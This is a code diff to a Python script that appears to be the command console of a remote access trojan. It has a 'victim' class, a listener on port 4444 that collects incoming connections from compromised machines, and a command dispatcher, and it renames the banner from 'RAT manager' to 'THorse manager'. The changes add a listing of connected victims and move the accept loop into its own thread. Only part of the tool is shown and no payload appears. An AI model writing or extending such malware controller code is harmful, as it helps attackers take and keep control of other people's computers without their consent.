@@ -44,7 +44,10 @@ class victim:
                 addresses.pop(pos)
                 break
         
-
+    def devices(self):
+        Log.info("Available devices are :")
+        for _,i in enumerate(connections):
+            print(f'\t[{_}]: {i.raddr}')
 
     def show(self):
         for i in connections:
@@ -61,16 +64,20 @@ class victim:
 
     def process(self,cmd):
         line = cmd.split()
-        cmd = line[0]
-        args = line[1:]
-        func = getattr(self, cmd, None)
-        if func:
-            try:
-                func(*args)
-            except Exception as e:
-                Log.error(f"Error: {e}")
-        else:
-            Log.error("No such command.")
+        try:
+            cmd = line[0]
+            args = line[1:]
+            func = getattr(self, cmd, None)
+            if func:
+                try:
+                    func(*args)
+                except Exception as e:
+                    Log.error(f"Error: {e}")
+            else:
+                Log.error("No such command.")
+        except Exception as e:
+            # print('error ignored')
+            print("",end='')
         self.home()
 
 
@@ -78,22 +85,28 @@ class victim:
         cmd = input("home > ")
         self.process(cmd)
 
+def start():
+    while True:
+        try:
+            conn, addr = s.accept()
+            Log.success(f"conneted with {addr}")
+            connections.append(conn)
+            addresses.append(addr)  
+            # t = Thread(target = obj.home)
+            # t.start()
+            # obj.home()
+        except Exception:
+            break   
+
 if __name__ == "__main__":
     # if len(sys.argv) != 3:
     #     print ("Usage : ")
     #     print ("\tpython master.py [HOST] [PORT]")
     #     exit(1)
     Log.success(f"Server started at {socket.gethostbyname(socket.gethostname())}:4444")
-    Log.success(pyfiglet.figlet_format('RAT manager'))
+    Log.success(pyfiglet.figlet_format('THorse manager'))
     obj = victim()
-    while True:
-        try:
-            conn, addr = s.accept()
-            Log.success(f"conneted with {addr}")
-            obj.home()
-            connections.append(conn)
-            addresses.append(addr)            
-            t = Thread(target = obj.home)
-            t.start()
-        except Exception:
-            break   
+    t = Thread(target =start)
+    t.start()
+    t1 = Thread(target = obj.home)
+    t1.start()
